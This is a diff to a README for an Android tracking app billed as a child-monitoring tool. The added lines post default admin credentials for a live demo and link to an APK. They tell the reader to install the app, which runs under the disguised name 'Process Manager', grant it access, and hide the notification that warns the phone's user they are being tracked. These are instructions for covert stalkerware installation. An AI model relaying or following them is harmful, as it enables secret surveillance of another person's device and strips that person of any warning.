@@ -3,6 +3,11 @@
 A cloud based Android MonitoringTool, powered by NodeJS For Child activities tracking.
 </p>
 Live demo : http://hackloop.cleverapps.io
+       •Username = Admin
+       •Password = Password
+ Tracking app : 
+https://github.com/7054company/hackloop/blob/master/server/app_sample/hackloop.apk
+Click to download & install it in andriod | Open app named ' Process Manager ' set the given access .. after few second you see a message in notification something is tracking you activity ..& Just hide this notification by system to show .. | Enjoy it..
 
 ## Features
 - GPS Logging
